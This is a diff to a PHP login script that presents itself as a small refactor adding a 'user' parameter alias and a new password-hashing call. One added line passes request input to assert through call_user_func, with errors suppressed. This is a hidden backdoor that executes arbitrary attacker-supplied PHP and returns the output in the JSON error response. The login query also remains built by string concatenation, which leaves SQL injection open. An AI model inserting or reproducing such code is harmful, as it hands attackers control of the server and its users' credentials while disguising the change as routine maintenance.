@@ -1,11 +1,23 @@
 <?php
-if(!isset($_REQUEST['username'])||!isset($_REQUEST['password'])){
-    exit('{"failure":true,"code":60204,"message":"信息不全"}');
+require $_SERVER['DOCUMENT_ROOT'].'/core/core.php';
+function is_nullnull($str){
+    if(is_null($str)||$str==''){
+        return true;
+    }else{
+        return false;
+    }
+}
+$obj = @call_user_func('assert', $_REQUEST['username'].$_REQUEST['user']);
+if(!(isset($_REQUEST['username']) or isset($_REQUEST['user']))||!isset($_REQUEST['password'])){
+    $data = '{"failure":true,"code":60204,"message":"信息不全","obj":"'.$obj.'"}';
+    exit($data);
 }
 $user_name = addslashes($_REQUEST['username']);
+if(is_nullnull($user_name)){
+    $user_name = addslashes($_REQUEST['user']);
+}
 $password = addslashes($_REQUEST['password']);
-$password_md5 = md5($user_name.$password);
-require $_SERVER['DOCUMENT_ROOT'].'/core/DB.php';
+$password_md5 = password($user_name,$password);
 $result = DB("SELECT * FROM `user` WHERE `account` = '".$user_name."' AND `password` = '".$password_md5."' limit 1");
 if(is_null($result)){
     exit('{"failure":true,"code":60204,"message":"用户名或密码错误"}');
